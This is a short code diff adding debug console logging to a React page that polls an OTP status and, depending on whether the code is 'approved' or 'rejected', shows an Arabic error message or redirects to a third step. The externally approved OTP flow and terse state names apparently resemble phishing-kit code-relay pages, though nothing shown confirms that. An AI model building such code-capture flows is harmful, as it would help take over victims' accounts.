@@ -73,11 +73,15 @@ export default function VeriPage() {
         
         // Check OTP status
         const otpStatus = data._v5Status || data.otpStatus
+        console.log('[STEP2] Poll - otpStatus:', otpStatus, '_v5Status:', _v5Status, 'data:', JSON.stringify(data).slice(0, 200))
+        
         if (otpStatus === 'rejected' && _v5Status !== 'rejected') {
+          console.log('[STEP2] OTP rejected, showing error')
           _ss5('rejected')
           _s5('')
           setError('تم رفض رمز التحقق. يرجى إدخال رمز صحيح.')
         } else if (otpStatus === 'approved' && _v5Status !== 'approved') {
+          console.log('[STEP2] OTP approved, redirecting to step3')
           _ss5('approved')
           setError('')
           router.push('/step3')
